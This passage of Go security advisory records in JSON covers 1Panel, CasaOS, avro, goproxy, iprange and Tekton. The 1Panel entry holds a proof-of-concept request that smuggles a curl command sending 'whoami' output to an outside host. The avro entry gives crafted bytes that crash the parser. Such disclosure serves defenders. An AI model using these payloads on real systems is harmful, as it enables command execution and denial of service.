"https://github.com/kubernetes/kubernetes/pull/118471"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118473"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118474"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118512"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/07/06/2"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-05T22:46:57Z", "nvd_published_at": "2023-07-03T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7x2c-fgx6-xf9h", "modified": "2023-07-07T22:18:09Z", "published": "2023-07-05T21:38:53Z", "aliases": ["CVE-2023-36458"], "summary": "1Panel vulnerable to command injection when entering the container terminal", "details": "### Impact\n\nThe authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.\n\n1. Vulnerability analysis.\n\n```\nbackend\\app\\api\\v1\\terminal.go#ContainerWsSsh\n```\n![image](https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png)\n\n2. vulnerability reproduction.\n\n```\nGET /api/v1/containers/exec?cols=80&rows=24&containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&user=asd&command=/bin/bash HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nSec-WebSocket-Version: 13\nOrigin: http://192.168.109.152:40982\nSec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==\nConnection: keep-alive, Upgrade\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\nPragma: no-cache\nCache-Control: no-cache\nUpgrade: websocket\n```\n\n3. The successful execution of system commands.\n![image](https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png)\n\nAffected versions: <= 1.3.5\n\n### Patches\n\nThe vulnerability has been fixed in v1.3.6.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.3.6.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36458"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6"}], "database_specific": {"cwe_ids": ["CWE-77"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-05T21:38:53Z", "nvd_published_at": "2023-07-05T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m5q5-8mfw-p2hr", "modified": "2023-10-24T23:02:49Z", "published": "2023-07-17T14:40:16Z", "aliases": ["CVE-2023-37266"], "summary": "CasaOS contains weak JWT secrets", "details": "### Impact\n\nUnauthenticated attackers can craft arbitrary JWTs and access features that usually require authentication and execute arbitrary commands as `root` on CasaOS instances.\n\n### Patches\n\nThe problem was addressed by improving the validation of JWTs in 705bf1f. This patch is part of CasaOS 0.4.4.\n\n### Workarounds\n\nUsers should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly.\n\n### References\n\n- 705bf1f\n- https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/IceWhaleTech/CasaOS"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS/security/advisories/GHSA-m5q5-8mfw-p2hr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37266"}, {"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS/commit/705bf1facbffd2ca40b159b0303132b6fdf657ad"}, {"type": "PACKAGE", "url": "https://github.com/IceWhaleTech/CasaOS"}, {"type": "WEB", "url": "https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/"}], "database_specific": {"cwe_ids": ["CWE-1391", "CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-17T14:40:16Z", "nvd_published_at": "2023-07-17T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9x44-9pgq-cf45", "modified": "2023-07-19T10:54:45Z", "published": "2023-07-17T10:55:30Z", "aliases": ["CVE-2023-37475"], "summary": "avro vulnerable to denial of service via attacker-controlled parameter", "details": "### Summary\nA well-crafted string passed to avro's `github.com/hamba/avro/v2.Unmarshal()` can throw a `fatal error: runtime: out of memory` which is unrecoverable and can cause denial of service of the consumer of avro.\n\n### Details\nThe root cause of the issue is that avro uses part of the input to `Unmarshal()` to determine the size when creating a new slice.\n\nIn the reproducer below, the first few bytes determine the size of the slice.\n\nThe root cause is on line 239 here:\nhttps://github.com/hamba/avro/blob/3abfe1e6382c5dccf2e1a00260c51a64bc1f1ca1/reader.go#L216-L242\n\n### PoC\nThe issue was found during a security audit of Dapr, and I attach a reproducer that shows how the issue affects Dapr.\n\nDapr uses an older version of the avro library, but it is also affected if bumping avro to latest.\n\nTo reproduce:\n```bash\ncd /tmp\ngit clone --depth=1 https://github.com/dapr/components-contrib\ncd components-contrib/pubsub/pulsar\n```\nnow add this test to the `pulsar_test.go`:\n```golang\nfunc TestParsePublishMetadata2(t *testing.T) {\n        m := &pubsub.PublishRequest{}\n        m.Data = []byte{246, 255, 255, 255, 255, 10, 255, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}\n        _, _ = parsePublishMetadata(m, schemaMetadata{protocol: avroProtocol, value: \"bytes\"})\n}\n```\nrun the test with `go test -run=TestParsePublishMetadata2`.\n\nYou should see this stacktrace:\n\n```\nfatal error: runtime: out of memory                                                                                                                                \n                                                                                 \nruntime stack:                                                                                                                                                                                                                                                                                                                        \nruntime.throw({0xc32c9c?, 0x8000?})                                              \n        /usr/local/go/src/runtime/panic.go:1047 +0x5d fp=0x7ffd9b347ed8 sp=0x7ffd9b347ea8 pc=0x445a9d                                                                                                                                                                                                                                 \nruntime.sysMapOS(0xc000400000, 0x2c00000000?)                                                                                                                      \n        /usr/local/go/src/runtime/mem_linux.go:187 +0x11b fp=0x7ffd9b347f20 sp=0x7ffd9b347ed8 pc=0x424dfb                                                                                                                                                                                                                             \nruntime.sysMap(0x11ab260?, 0xc3ffffffff?, 0x11bb3f8?)                                                                                                              \n        /usr/local/go/src/runtime/mem.go:142 +0x35 fp=0x7ffd9b347f50 sp=0x7ffd9b347f20 pc=0x4247d5                                                                                                                                                                                                                                    \nruntime.(*mheap).grow(0x11ab260, 0x1600000?)                                     \n        /usr/local/go/src/runtime/mheap.go:1522 +0x252 fp=0x7ffd9b347fc8 sp=0x7ffd9b347f50 pc=0x436832                                                                                                                                                                                                                                \nruntime.(*mheap).allocSpan(0x11ab260, 0x1600000, 0x0, 0xae?)                                                                                                       \n        /usr/local/go/src/runtime/mheap.go:1243 +0x1b7 fp=0x7ffd9b348060 sp=0x7ffd9b347fc8 pc=0x435f77                                                                                                                                                                                                                                \nruntime.(*mheap).alloc.func1()                                                                                                                                     \n        /usr/local/go/src/runtime/mheap.go:961 +0x65 fp=0x7ffd9b3480a8 sp=0x7ffd9b348060 pc=0x435a25                                                                                                                                                                                                                                  \nruntime.systemstack()                                                            \n        /usr/local/go/src/runtime/asm_amd64.s:496 +0x49 fp=0x7ffd9b3480b0 sp=0x7ffd9b3480a8 pc=0x47a469                                                                                                                                                                                                                               \n                                                                                 \ngoroutine 22 [running]:                                                                                                                                                                                                                                                                                                               \nruntime.systemstack_switch()                                                     \n        /usr/local/go/src/runtime/asm_amd64.s:463 fp=0xc000080930 sp=0xc000080928 pc=0x47a400                                                                                                                                                                                                                                         \nruntime.(*mheap).alloc(0x422a90?, 0x1160f40?, 0x38?)                                                                                                               \n        /usr/local/go/src/runtime/mheap.go:955 +0x65 fp=0xc000080978 sp=0xc000080930 pc=0x435965                                                                                                                                                                                                                                      \nruntime.(*mcache).allocLarge(0x2?, 0x2bfffffffb, 0x1)                                                                                                              \n        /usr/local/go/src/runtime/mcache.go:234 +0x85 fp=0xc0000809c0 sp=0xc000080978 pc=0x423865                                                                                                                                                                                                                                     \nruntime.mallocgc(0x2bfffffffb, 0xb44860, 0x1)                                                                                                                      \n        /usr/local/go/src/runtime/malloc.go:1053 +0x4fe fp=0xc000080a28 sp=0xc0000809c0 pc=0x41a57e                                                                                                                                                                                                                                   \nruntime.makeslice(0xc00024cd20?, 0x4d8560d018?, 0xc000080b18?)                                                                                                     \n        /usr/local/go/src/runtime/slice.go:103 +0x52 fp=0xc000080a50 sp=0xc000080a28 pc=0x45de72                                                                                                                                                                                                                                      \ngithub.com/hamba/avro/v2.(*Reader).readBytes(0xc00024cd20, {0xc27ca1, 0x5})                                                                                        \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:239 +0x1b7 fp=0xc000080ac0 sp=0xc000080a50 pc=0x834417                                                                                                                                                                                                       \ngithub.com/hamba/avro/v2.(*Reader).ReadBytes(...)                                                                                                                  \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:203                                                                                       \ngithub.com/hamba/avro/v2.(*Reader).ReadNext(0xfaf5531d980c4e50?, {0xd24d90, 0xc0001a1da0})                                                                                                                                                                                                                                            \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader_generic.go:63 +0x44c fp=0xc000080ca0 sp=0xc000080ac0 pc=0x8349ec                                                                                                                                                                                                \ngithub.com/hamba/avro/v2.(*efaceDecoder).Decode(0xc0001188f0?, 0xc00019fd10, 0xc0001a1da0?)                                                                                                                                                                                                                                           \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec_dynamic.go:18 +0x1a5 fp=0xc000080d18 sp=0xc000080ca0 pc=0x8221c5                                                                                                                                                                                                 \ngithub.com/hamba/avro/v2.(*Reader).ReadVal(0xc00024cd20, {0xd24d90, 0xc0001a1da0}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                                                                          \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec.go:53 +0x139 fp=0xc000080d98 sp=0xc000080d18 pc=0x8200f9                                                                                                                                                                                                         \ngithub.com/hamba/avro/v2.(*frozenConfig).Unmarshal(0xc000158080, {0xd24d90, 0xc0001a1da0}, {0xc00013a640?, 0x535d2f?, 0x536253?}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                           \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/config.go:150 +0x6e fp=0xc000080de8 sp=0xc000080d98 pc=0x832b2e                                                                                                                                                                                                        \ngithub.com/hamba/avro/v2.Unmarshal(...)                                                                                                                                                                                                                                                                                               \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/decoder.go:49                                                                                                                                                                                                                                                          \ngithub.com/dapr/components-contrib/pubsub/pulsar.parsePublishMetadata(0xc000080f18, {{0xc27698?, 0x59a?}, {0xc27ca1?, 0x536220?}})                                                                                                                                                                                                    \n        /tmp/components-contrib/pubsub/pulsar/pulsar.go:300 +0x1f5 fp=0xc000080ef0 sp=0xc000080de8 pc=0xa3c1d5                                                                                                                                                                                                                        \ngithub.com/dapr/components-contrib/pubsub/pulsar.TestParsePublishMetadata2(0x413239?)                                                                              \n        /tmp/components-contrib/pubsub/pulsar/pulsar_test.go:154 +0xb0 fp=0xc000080f70 sp=0xc000080ef0 pc=0xa3d1b0                                                                                                                                                                                                                    \ntesting.tRunner(0xc0001b56c0, 0xc789e0)                                                                                                                            \n        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc000080fc0 sp=0xc000080f70 pc=0x53632b                                                                                                                                                                                                                                  \ntesting.(*T).Run.func1()                                                                                                                                           \n        /usr/local/go/src/testing/testing.go:1629 +0x2a fp=0xc000080fe0 sp=0xc000080fc0 pc=0x53736a                                                                                                                                                                                                                                   \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000080fe8 sp=0xc000080fe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by testing.(*T).Run                                                      \n        /usr/local/go/src/testing/testing.go:1629 +0x3ea                                                                                                                                                                                                                                                                              \n \ngoroutine 1 [chan receive]:                                                                                                                                                                                                                                                                                                           \nruntime.gopark(0x1193660?, 0xc000122900?, 0xf0?, 0x28?, 0xc00019da28?)                                                                                             \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00019d9a8 sp=0xc00019d988 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.chanrecv(0xc0002423f0, 0xc00019daa7, 0x1)                                                                                                                                                                                                                                                                                     \n        /usr/local/go/src/runtime/chan.go:583 +0x49d fp=0xc00019da38 sp=0xc00019d9a8 pc=0x4137fd                                                                                                                                                                                                                                      \nruntime.chanrecv1(0x11926e0?, 0xb445e0?)                                         \n        /usr/local/go/src/runtime/chan.go:442 +0x18 fp=0xc00019da60 sp=0xc00019da38 pc=0x4132f8                                                                                                                                                                                                                                       \ntesting.(*T).Run(0xc0001b5520, {0xc34a0b?, 0x535ba5?}, 0xc789e0)                                                                                                   \n        /usr/local/go/src/testing/testing.go:1630 +0x405 fp=0xc00019db20 sp=0xc00019da60 pc=0x5371e5                                                                                                                                                                                                                                  \ntesting.runTests.func1(0x1193660?)                                               \n        /usr/local/go/src/testing/testing.go:2036 +0x45 fp=0xc00019db70 sp=0xc00019db20 pc=0x5393a5                                                                                                                                                                                                                                   \ntesting.tRunner(0xc0001b5520, 0xc00019dc88)                                      \n        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc00019dbc0 sp=0xc00019db70 pc=0x53632b                                                                                                                                                                                                                                  \ntesting.runTests(0xc000228820?, {0x11487c0, 0xa, 0xa}, {0xc00023fb60?, 0x100c00019dd10?, 0x1192d20?})                                                                                                                                                                                                                                 \n        /usr/local/go/src/testing/testing.go:2034 +0x489 fp=0xc00019dcb8 sp=0xc00019dbc0 pc=0x539289                                                                                                                                                                                                                                  \ntesting.(*M).Run(0xc000228820)                                                   \n        /usr/local/go/src/testing/testing.go:1906 +0x63a fp=0xc00019df00 sp=0xc00019dcb8 pc=0x537bfa                                                                                                                                                                                                                                  \nmain.main()                                                                      \n        _testmain.go:65 +0x1aa fp=0xc00019df80 sp=0xc00019df00 pc=0xa3f9ea                                                                                         \nruntime.main()                                                                   \n        /usr/local/go/src/runtime/proc.go:250 +0x207 fp=0xc00019dfe0 sp=0xc00019df80 pc=0x4483c7                                                                                                                                                                                                                                      \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00019dfe8 sp=0xc00019dfe0 pc=0x47c621                                                                                                                                                                                                                                   \n\ngoroutine 2 [force gc (idle)]:                                                   \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006cfb0 sp=0xc00006cf90 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.forcegchelper()                                                          \n        /usr/local/go/src/runtime/proc.go:305 +0xb0 fp=0xc00006cfe0 sp=0xc00006cfb0 pc=0x448630                                                                                                                                                                                                                                       \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006cfe8 sp=0xc00006cfe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.init.6                                                        \n        /usr/local/go/src/runtime/proc.go:293 +0x25                                                                                                                \n\ngoroutine 3 [GC sweep wait]:                                                     \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006d780 sp=0xc00006d760 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.bgsweep(0x0?)                                                            \n        /usr/local/go/src/runtime/mgcsweep.go:278 +0x8e fp=0xc00006d7c8 sp=0xc00006d780 pc=0x43282e                                                                                                                                                                                                                                   \nruntime.gcenable.func1()                                                         \n        /usr/local/go/src/runtime/mgc.go:178 +0x26 fp=0xc00006d7e0 sp=0xc00006d7c8 pc=0x427ae6                                                                                                                                                                                                                                        \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006d7e8 sp=0xc00006d7e0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.gcenable                                                      \n        /usr/local/go/src/runtime/mgc.go:178 +0x6b                                                                                                                 \n\ngoroutine 4 [GC scavenge wait]:                                                  \nruntime.gopark(0xc00003c070?, 0xd19648?, 0x1?, 0x0?, 0x0?)                                                                                                         \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006df70 sp=0xc00006df50 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.(*scavengerState).park(0x1192e40)                                        \n        /usr/local/go/src/runtime/mgcscavenge.go:400 +0x53 fp=0xc00006dfa0 sp=0xc00006df70 pc=0x430753                                                                                                                                                                                                                                \nruntime.bgscavenge(0x0?)                                                         \n        /usr/local/go/src/runtime/mgcscavenge.go:628 +0x45 fp=0xc00006dfc8 sp=0xc00006dfa0 pc=0x430d25                                                                                                                                                                                                                                \nruntime.gcenable.func2()                                                         \n        /usr/local/go/src/runtime/mgc.go:179 +0x26 fp=0xc00006dfe0 sp=0xc00006dfc8 pc=0x427a86                                                                                                                                                                                                                                        \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006dfe8 sp=0xc00006dfe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.gcenable                                                      \n        /usr/local/go/src/runtime/mgc.go:179 +0xaa                                                                                                                 \n\ngoroutine 18 [finalizer wait]:                                                   \nruntime.gopark(0x1a0?, 0x1193660?, 0xe0?, 0x24?, 0xc00006c770?)                                                                                                    \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006c628 sp=0xc00006c608 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.runfinq()                                                                \n        /usr/local/go/src/runtime/mfinal.go:193 +0x107 fp=0xc00006c7e0 sp=0xc00006c628 pc=0x426b27                                                                                                                                                                                                                                    \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006c7e8 sp=0xc00006c7e0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.createfing                                                    \n        /usr/local/go/src/runtime/mfinal.go:163 +0x45\n\ngoroutine 19 [IO wait]:                                                          \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc000185a78 sp=0xc000185a58 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.netpollblock(0x0?, 0x4100cf?, 0x0?)                                      \n        /usr/local/go/src/runtime/netpoll.go:527 +0xf7 fp=0xc000185ab0 sp=0xc000185a78 pc=0x440e17                                                                                                                                                                                                                                    \ninternal/poll.runtime_pollWait(0x7f4d85613218, 0x72)                                                                                                               \n        /usr/local/go/src/runtime/netpoll.go:306 +0x89 fp=0xc000185ad0 sp=0xc000185ab0 pc=0x476b29                                                                                                                                                                                                                                    \ninternal/poll.(*pollDesc).wait(0xc000158980?, 0xc0001b0ca0?, 0x0)                                                                                                  \n        /usr/local/go/src/internal/poll/fd_poll_runtime.go:84 +0x32 fp=0xc000185af8 sp=0xc000185ad0 pc=0x4b4832                                                                                                                                                                                                                       \ninternal/poll.(*pollDesc).waitRead(...)                                          \n        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89                                                                                                      \ninternal/poll.(*FD).ReadMsg(0xc000158980, {0xc0001b0ca0, 0x10, 0x10}, {0xc00016a620, 0x1000, 0x1000}, 0x1?)                                                                                                                                                                                                                           \n        /usr/local/go/src/internal/poll/fd_unix.go:304 +0x3aa fp=0xc000185be8 sp=0xc000185af8 pc=0x4b6f2a                                                                                                                                                                                                                             \nnet.(*netFD).readMsg(0xc000158980, {0xc0001b0ca0?, 0x1?, 0xd26db0?}, {0xc00016a620?, 0x1?, 0x5?}, 0xb?)                                                                                                                                                                                                                               \n        /usr/local/go/src/net/fd_posix.go:78 +0x37 fp=0xc000185c70 sp=0xc000185be8 pc=0x68cb57                                                                                                                                                                                                                                        \nnet.(*UnixConn).readMsg(0xc000122690, {0xc0001b0ca0?, 0xc00012f038?, 0xd1da40?}, {0xc00016a620?, 0xd1da40?, 0xc0001b6300?})                                                                                                                                                                                                           \n        /usr/local/go/src/net/unixsock_posix.go:115 +0x4f fp=0xc000185d00 sp=0xc000185c70 pc=0x6a7f6f                                                                                                                                                                                                                                 \nnet.(*UnixConn).ReadMsgUnix(0xc000122690, {0xc0001b0ca0?, 0x422a90?, 0xc0001b6300?}, {0xc00016a620?, 0x41a68a?, 0xc00012f260?})                                                                                                                                                                                                       \n        /usr/local/go/src/net/unixsock.go:143 +0x3c fp=0xc000185d78 sp=0xc000185d00 pc=0x6a69bc                                                                                                                                                                                                                                       \ngithub.com/godbus/dbus.(*oobReader).Read(0xc00016a600, {0xc0001b0ca0?, 0xc000185e28?, 0x41aa67?})                                                                                                                                                                                                                                     \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:21 +0x45 fp=0xc000185df0 sp=0xc000185d78 pc=0x8c1d85                                                                                                                                                                        \nio.ReadAtLeast({0xd1e040, 0xc00016a600}, {0xc0001b0ca0, 0x10, 0x10}, 0x10)                                                                                         \n        /usr/local/go/src/io/io.go:332 +0x9a fp=0xc000185e38 sp=0xc000185df0 pc=0x4af45a                                                                           \nio.ReadFull(...)                                                                 \n        /usr/local/go/src/io/io.go:351                                           \ngithub.com/godbus/dbus.(*unixTransport).ReadMessage(0xc00012ea80)                                                                                                  \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:91 +0x11e fp=0xc000185f68 sp=0xc000185e38 pc=0x8c239e                                                                                                                                                                       \ngithub.com/godbus/dbus.(*Conn).inWorker(0xc0001b2000)                                                                                                              \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/conn.go:294 +0x3b fp=0xc000185fc8 sp=0xc000185f68 pc=0x8ab47b                                                                                                                                                                                 \ngithub.com/godbus/dbus.(*Conn).Auth.func1()                                      \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x26 fp=0xc000185fe0 sp=0xc000185fc8 pc=0x8a8766                                                                                                                                                                                 \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000185fe8 sp=0xc000185fe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by github.com/godbus/dbus.(*Conn).Auth                                                                                                                     \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x9ee                                                                                                                                                                                                                            \nexit status 2                                                                    \nFAIL    github.com/dapr/components-contrib/pubsub/pulsar        0.027s\n```\n\n### Impact\nAny use case of the avro Unmarshalling routine that accepts untrusted input is affected. \n\nThe impact is that an attacker can crash the running application and cause denial of service.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hamba/avro"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.13.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hamba/avro/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.13.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hamba/avro/security/advisories/GHSA-9x44-9pgq-cf45"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37475"}, {"type": "WEB", "url": "https://github.com/hamba/avro/pull/273"}, {"type": "WEB", "url": "https://github.com/hamba/avro/commit/b4a402f41cf44b6094b5131286830ba9bb1eb290"}, {"type": "PACKAGE", "url": "https://github.com/hamba/avro"}, {"type": "WEB", "url": "https://github.com/hamba/avro/blob/3abfe1e6382c5dccf2e1a00260c51a64bc1f1ca1/reader.go#L216-L242"}, {"type": "WEB", "url": "https://github.com/hamba/avro/releases/tag/v2.13.0"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-17T10:55:30Z", "nvd_published_at": "2023-07-17T17:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4r8x-2p26-976p", "modified": "2023-08-01T15:37:19Z", "published": "2023-07-18T21:30:37Z", "aliases": ["CVE-2023-37788"], "summary": "goproxy Denial of Service vulnerability", "details": "goproxy prior to pseudoversion 0.0.0-20230731152917-f99041a5c027 was discovered to contain an issue which can lead to a Denial of service (DoS) via unspecified vectors.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elazarl/goproxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20230731152917-f99041a5c027"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37788"}, {"type": "WEB", "url": "https://github.com/elazarl/goproxy/issues/502"}, {"type": "WEB", "url": "https://github.com/elazarl/goproxy/pull/507"}, {"type": "PACKAGE", "url": "https://github.com/elazarl/goproxy"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-19T22:11:42Z", "nvd_published_at": "2023-07-18T19:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f99h-w337-mv56", "modified": "2023-07-12T17:29:24Z", "published": "2023-07-12T17:29:24Z", "aliases": [], "summary": "iprange may panic when parsing ranges with invalid masks", "details": "Parsing a range with a mask larger than 32 bits causes a panic.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/malfunkt/iprange"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.9.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/malfunkt/iprange/issues/1"}, {"type": "PACKAGE", "url": "https://github.com/malfunkt/iprange"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-12T17:29:24Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w2h3-vvvq-3m53", "modified": "2023-07-07T18:46:19Z", "published": "2023-07-07T18:46:19Z", "aliases": ["CVE-2023-37264"], "summary": "Pipelines do not validate child UIDs", "details": "### Summary\nPipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.\n\nWe should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. \n\n### Details\nWhile we [store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference](https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372), we only store (api version, kind, name) in the [ChildStatusReference](https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference) .\n\nThis means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.\n\nI believe this is also true for [TaskRuns -> Pods since it looks like we only lookup by name](https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992), though I haven't tested this.\n\nIf you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying 